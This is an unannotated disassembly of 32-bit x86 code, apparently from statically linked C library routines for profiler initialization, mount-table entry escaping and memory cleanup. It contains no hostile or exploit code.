mov edx, 0x100000
mov dword [0x80aaa28], 0x100000
lea eax, [edx*8]
xor ebx, ebx
mov ecx, 5
shl edx, 4
mov dword [var_260h], eax
lea edi, [var_8ch]
lea eax, [eax + edx]
shr esi, 2
mov edx, dword [var_24ch]
cld
lea eax, [edx + eax*4 + 0x40]
mov dword [var_254h], eax
mov eax, ebx
rep stosd dword es:[edi], eax
mov dword [var_a4h], esi
mov dword [var_8ch], 0x6e6f6d67
mov dword [var_88h], 0x1ffff
lea edi, [var_94h]
mov edx, dword [var_240h]
mov ecx, dword [var_244h]
mov dword [var_ach], edx
mov dword [var_a8h], ecx
call fcn.08090d00
mov dword [var_a0h], eax
mov ecx, 1
mov dword [var_9ch], 0x6f636573
cld
mov eax, ebx
mov dword [var_98h], 0x73646e
rep stosd dword es:[edi], eax
mov word [edi], 0
mov byte [edi + 2], 0
mov ebx, dword [0x80aabfc]
mov byte [var_8dh], 0x73
mov dword [esp], ebx
call fcn.08053400
mov esi, eax
mov eax, dword [0x80aac20]
mov dword [esp], eax
call fcn.08053400
lea eax, [eax + esi + 0x1c]
and eax, 0xfffffffc
sub esp, eax
lea edx, [var_27h]
and edx, 0xfffffff0
mov dword [var_264h], edx
mov dword [esp], edx
mov dword [var_4h], ebx
call fcn.080773c0
mov byte [eax], 0x2f
mov edx, dword [0x80aac20]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
mov dword [var_4h], str..profile
mov dword [var_8h], 9
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], 0x20042
mov dword [var_8h], 0x1b6
mov ecx, dword [var_264h]
mov dword [esp], ecx
call fcn.08053ec0
mov dword [var_278h], eax
inc eax
je 0x8082baf
lea eax, [var_6ch]
mov dword [var_8h], eax
mov edx, dword [var_278h]
mov dword [esp], 3
mov dword [var_4h], edx
call fcn.08053dc0
test eax, eax
js 0x8082723
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
je 0x8082786
mov esi, str._s:_cannot_stat_file:__s_n
call fcn.08048b20
cmp dword [var_278h], 0xffffffff
mov ebx, dword [eax]
je 0x8082746
mov edi, dword [var_278h]
mov dword [esp], edi
call fcn.08053f20
lea eax, [var_23ch]
mov dword [var_8h], 0x190
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08053300
mov dword [var_ch], eax
mov eax, dword [var_264h]
mov dword [var_4h], esi
mov dword [var_8h], eax
mov dword [esp], 2
call fcn.08081ca0
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov esi, dword [var_3ch]
mov ebx, dword [var_40h]
mov ecx, esi
or ecx, ebx
mov dword [var_268h], ecx
jne 0x8082b71
mov edx, dword [0x80aac74]
mov dword [var_26ch], esp
cld
lea eax, [edx + 0x12]
mov ecx, edx
and eax, 0xfffffffc
shr ecx, 2
sub esp, eax
mov eax, dword [var_268h_2]
lea esi, [var_27h]
and esi, 0xfffffff0
test dl, 2
mov edi, esi
rep stosd dword es:[edi], eax
mov ebx, edi
je 0x80827d6
mov word [edi], 0
add ebx, 2
and edx, 1
je 0x80827de
mov byte [ebx], 0
mov dword [var_8h], 0
mov eax, dword [0x80aac74]
dec eax
not eax
and eax, dword [var_250h_2]
mov dword [var_4h], eax
mov eax, dword [var_274h]
mov dword [esp], eax
call fcn.08090150
inc eax
je 0x8082b61
mov eax, dword [0x80aac74]
dec eax
and eax, dword [var_250h_2]
mov dword [var_4h], esi
mov dword [var_8h], eax
mov edx, dword [var_274h]
mov dword [esp], edx
call fcn.08053fd0
cmp eax, 0xffffffff
mov ebx, eax
jne 0x8082840
call fcn.08048b20
cmp dword [eax], 4
je 0x808280d
test ebx, ebx
js 0x8082b61
mov esp, dword [var_26ch_2]
mov dword [var_14h], 0
mov esi, str._s:_cannot_map_file:__s_n
mov eax, dword [var_278h]
mov dword [var_ch], 1
mov dword [var_8h], 3
mov dword [var_10h], eax
mov edx, dword [var_254h]
mov dword [esp], 0
mov dword [var_4h], edx
call fcn.080546d0
mov dword [var_250h], eax
inc eax
je 0x8082728
mov ecx, dword [var_278h]
mov dword [esp], ecx
call fcn.08053f20
mov edx, dword [var_3ch]
mov esi, dword [var_250h]
mov ecx, dword [var_250h]
add esi, 0x38
mov edi, edx
mov eax, esi
add ecx, 0x14
mov dword [var_248h], esi
add eax, dword [var_24ch]
lea ebx, [eax + 4]
add eax, 8
mov dword [0x80aaa10], eax
mov dword [0x80aaa1c], ebx
mov eax, dword [var_40h]
or edi, eax
jne 0x8082ade
mov eax, dword [var_8ch_2]
mov edx, dword [var_250h_2]
mov dword [edx], eax
mov eax, dword [var_88h_2]
mov dword [edx + 4], eax
mov eax, dword [var_84h]
mov dword [edx + 8], eax
mov eax, dword [var_80h]
mov dword [edx + 0xc], eax
mov eax, dword [var_7ch]
mov dword [edx + 0x14], 0
mov dword [edx + 0x10], eax
mov eax, dword [var_ach_2]
mov dword [ecx + 4], eax
mov eax, dword [var_a8h_2]
mov dword [ecx + 8], eax
mov eax, dword [var_a4h_2]
mov dword [ecx + 0xc], eax
mov eax, dword [var_a0h_2]
mov dword [ecx + 0x10], eax
mov eax, dword [var_9ch_2]
mov dword [ecx + 0x14], eax
mov eax, dword [var_98h_2]
mov dword [ecx + 0x18], eax
mov eax, dword [var_94h_2]
mov dword [ecx + 0x1c], eax
mov eax, dword [var_90h]
mov dword [ecx + 0x20], eax
mov eax, dword [0x80aaa1c]
mov dword [eax - 4], 1
mov dword [var_4h], 1
mov eax, dword [var_24ch]
add eax, dword [var_260h]
mov dword [esp], eax
call fcn.08051730
test eax, eax
mov dword [0x80aaa20], eax
je 0x8082c13
mov eax, dword [0x80aaa20]
mov ecx, dword [0x80aaa1c]
mov dword [0x80aaa2c], 0
mov edx, dword [0x80aaa28]
mov edi, eax
mov dword [var_270h], eax
add edi, dword [var_24ch_2]
mov eax, dword [ecx]
cmp eax, edx
mov dword [0x80aaa24], edi
jae 0x80829ce
mov edx, dword [ecx]
test edx, edx
mov dword [0x80aaa18], edx
mov esi, edx
je 0x8082a3a
mov edx, dword [0x80aaa10]
lea eax, [esi + esi*2]
mov edi, dword [0x80aaa24]
lea ebx, [eax*4]
mov dword [var_274h], edx
mov eax, dword [var_274h]
sub ebx, 0xc
mov ecx, dword [eax + ebx + 4]
mov eax, dword [0x80aaa2c]
mov edx, eax
shr ecx, 2
inc eax
mov dword [0x80aaa2c], eax
mov eax, dword [var_274h]
add eax, ebx
dec esi
mov dword [edi + edx*8], eax
mov eax, dword [var_270h]
movzx eax, word [eax + ecx*2]
mov word [edi + edx*8 + 4], ax
mov eax, dword [var_270h]
mov word [eax + ecx*2], dx
jne 0x80829f6
mov ecx, dword [var_25ch_2]
mov eax, 0x10000
sub ecx, dword [0x80aaa30]
cmp dword [var_24ch_2], ecx
jae 0x8082a9b
xor edx, edx
mov eax, ecx
div dword [var_24ch_2]
mov ebx, eax
mov eax, 1
cmp ebx, 0xffff
ja 0x8082a9b
cmp ebx, 0xff
mov eax, 0x10000
ja 0x8082a97
cmp ecx, 0xffffff
jbe 0x8082acf
mov ebx, dword [var_24ch_2]
mov eax, ecx
xor edx, edx
shr ebx, 8
div ebx
mov ebx, eax
mov eax, 0x1000000
xor edx, edx
div ebx
mov dword [var_ch], eax
mov eax, dword [0x80aaa30]
mov dword [var_8h], eax
mov ecx, dword [var_24ch_2]
mov dword [var_4h], ecx
mov esi, dword [var_248h_2]
mov dword [esp], esi
call fcn.08090b50
mov dword [0x80aaa14], 1
jmp 0x808277e
shl ecx, 8
xor edx, edx
mov eax, ecx
div dword [var_24ch_2]
jmp 0x8082a90
mov esi, dword [var_250h]
mov ecx, 0x14
lea edi, [var_8ch]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8082b1f
mov ecx, dword [var_250h]
mov eax, dword [ecx + 0x14]
test eax, eax
jne 0x8082b1f
mov esi, ecx
lea edi, [var_ach]
mov ecx, 0x20
add esi, 0x18
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8082b1f
mov eax, dword [ebx - 4]
dec eax
je 0x808296e
mov edx, dword [var_250h]
test edx, edx
je 0x8082b41
mov ecx, dword [var_254h]
mov dword [var_4h], ecx
mov esi, dword [var_250h]
mov dword [esp], esi
call fcn.08054780
mov eax, dword [0x80aac20]
mov dword [var_ch], eax
mov edi, dword [var_264h]
mov dword [var_4h], str._s:_file_is_no_correct_profile_data_file_for___s_n
mov dword [var_8h], edi
jmp 0x8082772
mov esi, str._s:_cannot_create_file:__s_n
mov esp, dword [var_26ch_2]
jmp 0x8082728
mov eax, dword [var_254h]
cdq
mov dword [var_280h], eax
mov eax, dword [var_280h]
mov dword [var_27ch], edx
mov ecx, dword [var_27ch]
xor eax, ebx
xor ecx, esi
or ecx, eax
je 0x808284e
mov edx, dword [var_278h_2]
mov dword [esp], edx
call fcn.08053f20
jmp 0x8082b1f
mov esi, str._s:_cannot_open_file:__s_n
jmp 0x8082728
lea esi, [esi]
test byte [ecx + 0x18], 1
je 0x8082529
mov eax, dword [ecx + 8]
mov edx, dword [var_274h]
mov edi, dword [var_258h]
and edx, eax
add eax, dword [ecx + 0x14]
lea eax, [edi + eax - 1]
and eax, dword [var_274h]
cmp edx, dword [var_240h_2]
cmovae edx, dword [var_240h_2]
cmp eax, dword [var_244h_2]
cmovbe eax, dword [var_244h_2]
mov dword [var_240h_2], edx
mov dword [var_244h_2], eax
jmp 0x8082529
mov esi, dword [var_254h]
mov dword [var_4h], esi
mov edi, dword [var_250h]
mov dword [esp], edi
call fcn.08054780
mov dword [var_4h], str.Out_of_memory_while_initializing_profiler_n
mov dword [esp], 2
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
nop
lea esi, [esi]
push ebp
mov ebp, esp
mov dword [eax], ecx
mov eax, dword [0x80aabd4]
mov dword [edx], eax
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_8h]
mov dword [var_4h], eax
mov eax, dword [arg_4h]
mov dword [esp], eax
call fcn.08082c50
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [esi + 0xc], 0
mov eax, dword [esi + 4]
lea ecx, [esi + 0xc]
mov dword [var_10h], 0
mov dword [var_ch], 2
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], 0
mov edx, dword [esi]
lea ebx, [edx + 0x1b8]
mov dword [esp], ebx
call fcn.0807e450
mov dword [esi + 8], eax
sub esp, 0x14
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
leave
jmp fcn.08055790
push ebp
mov ebp, esp
sub esp, 0x2c
mov dword [var_4h], esi
lea edx, [var_18h]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [var_18h], str.GLIBC_PRIVATE
mov dword [var_ch], 0
mov dword [var_10h], 1
mov dword [var_14h], 0x963cf85
mov dword [esi + 0xc], 0
mov eax, dword [esi + 4]
lea ecx, [esi + 0xc]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], edx
mov edx, dword [esi]
mov ebx, dword [edx + 0x1b4]
mov dword [esp], ebx
call fcn.0807e450
mov dword [esi + 8], eax
sub esp, 0x14
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_ch]
mov eax, dword [eax]
mov dword [arg_ch], eax
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [arg_8h], eax
leave
jmp fcn.08076e50
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08085180
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.080856c0
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08086280
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08088130
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808a440
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_8h], ebx
mov ecx, dword [arg_10h]
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov edx, dword [arg_14h]
mov esi, dword [arg_8h]
cmp ebx, ecx
je 0x808d52a
cmp edx, 0x1f
jg 0x808d500
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808cb40
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
and eax, 0xfffffff0
mov dword [var_sp_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
call fcn.0808cc10
jmp 0x808d4f5
cmp edx, 0x1f
jg 0x808d541
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808d080
jmp 0x808d4f5
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
and eax, 0xfffffff0
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0808d150
jmp 0x808d4f5
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x40
mov edx, dword [arg_ch]
mov esi, dword [arg_8h]
mov eax, dword [edx]
mov dword [var_28h], eax
mov eax, dword [edx + 4]
mov dword [var_24h], eax
mov eax, dword [edx + 8]
mov dword [var_20h], eax
mov eax, dword [edx + 0xc]
mov dword [var_1ch], eax
mov eax, dword [edx + 0x10]
mov dword [var_18h], eax
mov eax, dword [edx + 0x14]
mov dword [esp], esi
mov dword [var_8h], 2
mov dword [var_4h], 0
mov dword [var_14h], eax
call fcn.0804b400
mov edx, 1
test eax, eax
jne 0x8090860
mov ebx, dword [var_28h]
movzx eax, byte [ebx]
mov edx, ebx
test al, al
je 0x80907a2
cmp al, 0x20
je 0x80909ff
cmp al, 9
je 0x80909ff
cmp al, 0x5c
je 0x80909ff
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x8090782
mov ebx, dword [var_24h]
movzx eax, byte [ebx]
mov edx, ebx
test al, al
je 0x80907d0
mov esi, esi
cmp al, 0x20
je 0x809097a
cmp al, 9
je 0x809097a
cmp al, 0x5c
je 0x809097a
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x80907b0
mov ebx, dword [var_20h]
movzx eax, byte [ebx]
mov edx, ebx
test al, al
je 0x8090800
lea esi, [esi]
cmp al, 0x20
je 0x80908f2
cmp al, 9
je 0x80908f2
cmp al, 0x5c
je 0x80908f2
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x80907e0
mov edx, dword [var_1ch]
movzx eax, byte [edx]
mov ebx, edx
test al, al
je 0x8090824
lea esi, [esi]
cmp al, 0x20
je 0x8090869
cmp al, 9
je 0x8090869
cmp al, 0x5c
je 0x8090869
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x8090810
mov eax, dword [var_14h]
mov dword [var_sp_14h], edx
mov dword [var_4h], str._s__s__s__s__d__d_n
mov dword [esp], esi
mov dword [var_sp_1ch], eax
mov eax, dword [var_18h]
mov dword [var_sp_18h], eax
mov eax, dword [var_20h]
mov dword [var_10h], eax
mov eax, dword [var_24h]
mov dword [var_ch], eax
mov eax, dword [var_28h]
mov dword [var_8h], eax
call fcn.08049b80
mov edx, eax
shr edx, 0x1f
lea esp, [var_bp_8h]
mov eax, edx
pop ebx
pop esi
leave
ret
test al, al
je 0x8090824
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [var_2fh]
and eax, 0xfffffff0
mov edx, eax
mov dword [var_1ch], eax
lea esi, [esi]
movzx eax, byte [ebx]
cmp al, 0x20
je 0x80908e1
cmp al, 9
je 0x80908d0
cmp al, 0xa
je 0x80908bf
cmp al, 0x5c
je 0x80908b6
mov byte [edx], al
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x8090890
mov edx, dword [var_1ch]
jmp 0x8090824
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x80908a5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x80908a5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x80908a5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x80908a5
test al, al
je 0x8090800
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea edx, [var_2fh]
and edx, 0xfffffff0
mov dword [var_20h], edx
movzx eax, byte [ebx]
cmp al, 0x20
je 0x8090969
cmp al, 9
je 0x8090958
cmp al, 0xa
je 0x8090947
cmp al, 0x5c
je 0x809093e
mov byte [edx], al
lea esi, [esi]
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x8090917
jmp 0x8090800
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x8090930
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x8090930
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x8090930
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x8090930
test al, al
je 0x80907d0
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea edx, [var_2fh]
and edx, 0xfffffff0
mov dword [var_24h], edx
nop
movzx eax, byte [ebx]
cmp al, 0x20
je 0x80909ee
cmp al, 9
je 0x80909dd
cmp al, 0xa
je 0x80909cc
cmp al, 0x5c
je 0x80909c3
mov byte [edx], al
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x80909a0
jmp 0x80907d0
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x80909b5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x80909b5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x80909b5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x80909b5
test al, al
je 0x80907a2
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea edx, [var_2fh]
and edx, 0xfffffff0
mov dword [var_28h], edx
movzx eax, byte [ebx]
cmp al, 0x20
je 0x8090a79
cmp al, 9
je 0x8090a68
cmp al, 0xa
je 0x8090a57
cmp al, 0x5c
je 0x8090a4e
mov byte [edx], al
lea esi, [esi]
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x8090a24
jmp 0x80907a2
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x8090a40
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x8090a40
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x8090a40
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x8090a40
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov esi, dword [arg_ch]
mov dword [esp], esi
call fcn.08053400
mov edi, eax
mov eax, dword [arg_8h]
mov ebx, dword [eax + 0xc]
lea esi, [esi]
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.080535c0
test eax, eax
je 0x8090ae3
cmp eax, ebx
je 0x8090ae5
cmp byte [eax - 1], 0x2c
je 0x8090aed
mov dword [esp], ebx
mov dword [var_4h], 0x2c
call fcn.08076ce0
test eax, eax
mov ebx, eax
je 0x8090ae3
inc ebx
jmp 0x8090ab0
xor eax, eax
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
movzx edx, byte [edi + eax]
test dl, dl
je 0x8090ae5
cmp dl, 0x3d
je 0x8090ae5
cmp dl, 0x2c
jne 0x8090aca
jmp 0x8090ae5
push ebp
mov ebp, esp
mov eax, dword [arg_44h]
sub eax, dword [0x80aabc4]
mov edx, eax
shr edx, 0x1f
add eax, edx
sar eax, 1
mul dword [0x80aabc8]
shrd eax, edx, 0x10
cmp eax, dword [0x80aabc0]
mov edx, eax
jae 0x8090b42
mov eax, dword [0x80aabbc]
inc word [eax + edx*2]
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_ch]
mov dword [var_4h], 1
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808eb40
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_8h]
mov dword [var_8h], 0x80aad60
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.0808eb40
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
call fcn.0808eae0
mov eax, dword [arg_8h]
mov dword [var_8h], 0x80aabcc
mov dword [var_4h], fcn.08091260
mov dword [esp], eax
call fcn.08091500
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aac24]
test eax, eax
jne 0x8091c17
mov eax, dword [0x80aabdc]
test eax, eax
jne 0x8091c0a
leave
ret
add eax, 4
mov dword [esp], eax
call fcn.08091b80
jmp 0x8091c08
mov ecx, dword [0x80a95b8]
mov eax, dword [0x80aac08]
cmp dword [ecx + 4], eax
jne 0x8091bff
mov eax, dword [0x80aac04]
mov edx, dword [ecx]
mov dword [0x80aac24], 0
mov dword [ecx], eax
mov dword [esp], edx
call fcn.08051180
jmp 0x8091bff
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 4
mov esi, dword [arg_8h]
mov ecx, dword [esi + 0xc]
cmp edi, ecx
jae 0x8091d15
mov edx, dword [esi + 8]
xor ebx, ebx
mov esi, esi
mov eax, dword [edx + ebx + 8]
test eax, eax
jle 0x8091cb0
mov eax, dword [edx + ebx + 0x20]
test eax, eax
jne 0x8091cf8
inc edi
add ebx, 0x3c
cmp edi, ecx
jb 0x8091ca0
mov eax, dword [edx + 0xc]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [esi + 0xc]
mov eax, edx
shl eax, 4
sub eax, edx
shl eax, 2
add eax, dword [esi + 8]
mov eax, dword [eax - 0x2c]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [esi + 8]
mov dword [esp], eax
call fcn.08051180
mov dword [arg_8h], esi
add esp, 4
pop ebx
pop esi
pop edi
leave
jmp fcn.08051180
mov dword [esp], eax
call fcn.08083520
mov edx, dword [esi + 8]
lea eax, [ebx + edx]
mov dword [esp], eax
call dword [edx + ebx + 0x20]
mov ecx, dword [esi + 0xc]
mov edx, dword [esi + 8]
jmp 0x8091cb0
mov edx, dword [esi + 8]
jmp 0x8091cb8
push ebp
mov ebp, esp
sub esp, 8
call fcn.08091f50
call fcn.080921c0
mov eax, dword [0x80aaca0]
test eax, eax
jne 0x8091db6
mov eax, dword [0x80aac84]
test eax, eax
jne 0x8091daf
mov eax, dword [0x80aa85c]
test eax, eax
jne 0x8091d9d
leave
ret
mov dword [var_4h], fcn.08091c80
mov dword [esp], eax
call fcn.0807a7f0
jmp 0x8091d9b
call fcn.08091d20
jmp 0x8091d92
mov dword [var_4h], fcn.08051180
mov dword [esp], eax
call fcn.0807a7f0
jmp 0x8091d89
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [0x80aacac]
test eax, eax
je 0x8091df0
cmp eax, 0x80aa880
je 0x8091df0
mov dword [esp], eax
call fcn.08051180
mov esi, esi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [0x80aa890]
test ecx, ecx
je 0x8091e1f
mov eax, dword [0x80aa888]
mov dword [esp], eax
call fcn.08051180
leave
ret
mov eax, dword [0x80aa88c]
mov dword [var_4h], eax
mov eax, dword [0x80aa888]
mov dword [esp], eax
call fcn.08054780
jmp 0x8091e1d
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x8091e5f
mov dword [arg_8h], ebx
mov ebx, dword [var_4h]
leave
jmp fcn.08051180
mov dword [esp], eax
call fcn.08083790
jmp 0x8091e53
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aa894]
mov dword [var_4h], fcn.08091e40
mov dword [esp], eax
call fcn.0807a7f0
mov dword [0x80aa894], 0
leave
ret
push ebp
mov ebp, esp
sub esp, 8
call fcn.08063710
mov eax, dword [0x80aa99c]
mov dword [var_4h], fcn.08051180
mov dword [esp], eax
call fcn.0807a7f0
mov dword [0x80aa99c], 0
leave
ret
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x806372b
mov dword [esp], 0x80aa984
call section.
mov eax, dword [0x80aa840]
cmp eax, dword [0x80aa9a0]
je 0x806375b
mov eax, 0
mov dword [0x80aa840], 0
test eax, eax
je 0x8063757
mov dword [esp], 0x80aa984
call section.
xor eax, eax
leave
ret
test eax, eax
je 0x8063738
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aa9a0], 0
jmp 0x8063738
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 4
mov ebx, dword [0x80aac68]
cmp ebx, dword [0x80aac50]
je 0x809232a
mov eax, ebx
mov ebx, dword [ebx]
mov dword [esp], eax
call fcn.08051180
cmp ebx, dword [0x80aac50]
jne 0x8092316
mov esi, dword [0x80aac58]
test esi, esi
je 0x809235c
mov eax, dword [esi + 0x14]
mov ebx, dword [eax + 4]
mov dword [eax + 4], 0
test ebx, ebx
je 0x8092355
mov eax, ebx
mov ebx, dword [ebx + 4]
mov edx, dword [eax + 8]
test edx, edx
je 0x8092363
test ebx, ebx
jne 0x8092345
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x8092334
add esp, 4
pop ebx
pop esi
leave
ret
mov dword [esp], eax
call fcn.08051180
jmp 0x8092351
push ebp
mov ebp, esp
sub esp, 4
mov edx, dword [0x80aaae0]
test edx, edx
jne 0x80923a9
mov eax, dword [0x80aaae4]
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aaae4], 0
leave
ret
mov eax, edx
mov edx, dword [edx]
mov dword [esp], eax
mov dword [0x80aaae0], edx
call fcn.08051180
mov edx, dword [0x80aaae0]
test edx, edx
jne 0x80923a9
jmp 0x8092390
push ebp
mov ebp, esp
push ebx
call fcn.080923d1
